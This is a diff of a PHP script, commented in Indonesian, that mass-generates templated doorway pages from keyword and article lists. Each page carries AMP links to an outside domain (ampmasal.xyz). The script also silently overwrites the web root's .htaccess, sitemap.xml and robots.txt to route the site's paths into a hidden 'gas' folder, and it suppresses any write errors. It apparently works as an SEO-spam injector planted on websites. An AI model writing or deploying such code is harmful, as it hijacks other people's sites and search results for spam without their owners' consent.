@@ -30,8 +30,11 @@ $titlesFile = $title_txt;
 $descriptionsFile = $descriptions_txt;
 $artikelFile = $artikel_txt;
 
+$titles = [];
+$descriptions = [];
+$articles = [];
+
 try {
-    // Baca file titles
     $titleContent = getFileContent($titlesFile);
     $titles = array_filter(array_map('trim', explode("\n", $titleContent)));
     
@@ -39,7 +42,6 @@ try {
         throw new Exception("File title kosong atau tidak valid");
     }
     
-    // Baca file descriptions
     $descriptionContent = getFileContent($descriptionsFile);
     $descriptions = array_filter(array_map('trim', explode("\n", $descriptionContent)));
     
@@ -47,18 +49,116 @@ try {
         throw new Exception("File description kosong atau tidak valid");
     }
 
-    // Baca file artikel jika ada
-    if (isset($artikelFile)) {
-        $articleContent = getFileContent($artikelFile);
-        $articles = array_filter(array_map('trim', explode("\n", $articleContent)));
-        if (empty($articles)) {
-            throw new Exception("File artikel kosong atau tidak valid");
+    $articleContent = getFileContent($artikelFile);
+    $articles = array_filter(array_map('trim', explode("\n", $articleContent)));
+    
+    if (empty($articles)) {
+        throw new Exception("File artikel kosong atau tidak valid");
+    }
+
+    $templateContent = getFileContent($templateFile);
+
+    $keywordsContent = getFileContent($filename);
+    $lines = explode("\n", $keywordsContent);
+    $lines = array_filter(array_map('trim', $lines));
+
+    if (!is_dir($mainDir)) {
+        if (!mkdir($mainDir, 0755, true)) {
+            throw new Exception("Gagal membuat direktori '$mainDir'");
         }
     }
 
-    // [Rest of the code remains the same until sitemap generation]
+    $currentDomain = $_SERVER['HTTP_HOST'];
 
-    // Write sitemap file
+    $titleIndex = 0;
+    $descriptionIndex = 0;
+    $articleIndex = 0;
+
+    foreach ($lines as $line) {
+        $folderName = str_replace(' ', '-', trim($line));
+        $folderPath = "$mainDir/$folderName";
+        
+        $folderURL = ensureTrailingSlash("https://$currentDomain/$folderName");
+        $ampURL = ensureTrailingSlash("https://ampmasal.xyz/$folderName");
+        
+        $title = isset($titles[$titleIndex]) ? $titles[$titleIndex] : $titles[0];
+        $description = isset($descriptions[$descriptionIndex]) ? $descriptions[$descriptionIndex] : $descriptions[0];
+        $article = isset($articles[$articleIndex]) ? formatArticle($articles[$articleIndex]) : formatArticle($articles[0]);
+
+        $titleIndex = ($titleIndex + 1) % count($titles);
+        $descriptionIndex = ($descriptionIndex + 1) % count($descriptions);
+        $articleIndex = ($articleIndex + 1) % count($articles);
+
+        if (!is_dir($folderPath) && !mkdir($folderPath, 0755, true)) {
+            continue;
+        }
+
+        $customContent = str_replace(
+            [
+                '{{BRAND_NAME}}',
+                '{{URL_PATH}}',
+                '{{AMP_URL}}',
+                '{{BRANDS_NAME}}',
+                '{{TITLE}}',
+                '{{DESCRIPTION}}',
+                '{{ARTICLE_CONTENT}}'
+            ],
+            [
+                strtoupper($folderName),
+                $folderURL,
+                $ampURL,
+                strtolower($folderName),
+                $title,
+                $description,
+                $article
+            ],
+            $templateContent
+        );
+
+        $indexPath = "$folderPath/index.php";
+        if (file_put_contents($indexPath, $customContent) !== false) {
+            echo "🔗 <a href='$folderURL' target='_blank'>$folderURL</a><br>";
+            $successfulUrls[] = $folderURL;
+            chmod($indexPath, 0644);
+        }
+    }
+
+    // Generate .htaccess
+    $htaccess = "RewriteEngine On\n";
+    $htaccess .= "RewriteBase /\n\n";
+    $htaccess .= "# Enforce trailing slash\n";
+    $htaccess .= "RewriteCond %{REQUEST_URI} /+[^\.]+$\n";
+    $htaccess .= "RewriteRule ^(.+[^/])$ %{REQUEST_URI}/ [R=301,L]\n\n";
+    $htaccess .= "# Redirect from /gas/ URLs\n";
+    $htaccess .= "RewriteCond %{THE_REQUEST} \s/+gas/([^\s]+) [NC]\n";
+    $htaccess .= "RewriteRule ^ /%1 [R=301,L,NE]\n\n";
+    $htaccess .= "# Internal rewrite\n";
+    $htaccess .= "RewriteCond %{REQUEST_FILENAME} !-f\n";
+    $htaccess .= "RewriteCond %{REQUEST_FILENAME} !-d\n";
+    $htaccess .= "RewriteCond %{REQUEST_URI} !^/gas/\n";
+    $htaccess .= "RewriteRule ^([^/]+)/?$ gas/$1/ [L,PT]\n\n";
+    $htaccess .= "# Prevent direct gas access\n";
+    $htaccess .= "RewriteCond %{REQUEST_URI} ^/gas/\n";
+    $htaccess .= "RewriteCond %{ENV:REDIRECT_STATUS} ^$\n";
+    $htaccess .= "RewriteRule ^ - [F]\n\n";
+    $htaccess .= "# Disable directory indexing\n";
+    $htaccess .= "Options -Indexes\n\n";
+    $htaccess .= "# Prevent caching\n";
+    $htaccess .= "<IfModule mod_headers.c>\n";
+    $htaccess .= "    Header set Cache-Control \"no-cache, no-store, must-revalidate\"\n";
+    $htaccess .= "    Header set Pragma \"no-cache\"\n";
+    $htaccess .= "    Header set Expires 0\n";
+    $htaccess .= "</IfModule>";
+
+    // Tulis .htaccess ke root directory
+    $rootPath = $_SERVER['DOCUMENT_ROOT'];
+    if (@file_put_contents($rootPath . '/.htaccess', $htaccess) === false) {
+        error_log("Gagal menulis .htaccess ke: " . $rootPath . '/.htaccess');
+    } else {
+        @chmod($rootPath . '/.htaccess', 0644);
+    }
+
+    // Generate sitemap.xml
     $sitemap = '<?xml version="1.0" encoding="UTF-8"?>' . "\n";
     $sitemap .= '<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">' . "\n";
     
@@ -73,20 +173,17 @@ try {
     
     $sitemap .= "</urlset>";
 
-    $sitemapPath = dirname(__FILE__) . '/sitemap.xml';
-    if (file_put_contents($sitemapPath, $sitemap) !== false) {
-        chmod($sitemapPath, 0644);
+    if (@file_put_contents($rootPath . '/sitemap.xml', $sitemap) !== false) {
+        @chmod($rootPath . '/sitemap.xml', 0644);
         echo "<br>✅ Sitemap.xml berhasil dibuat<br>";
     }
 
     // Generate robots.txt
-    $currentDomain = isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : '';
     $robotsContent = "User-agent: *\nAllow: /\n";
     $robotsContent .= "Sitemap: https://" . $currentDomain . "/sitemap.xml";
 
-    $robotsPath = dirname(__FILE__) . '/robots.txt';
-    if (file_put_contents($robotsPath, $robotsContent) !== false) {
-        chmod($robotsPath, 0644);
+    if (@file_put_contents($rootPath . '/robots.txt', $robotsContent) !== false) {
+        @chmod($rootPath . '/robots.txt', 0644);
         echo "✅ Robots.txt berhasil dibuat<br>";
     }
 
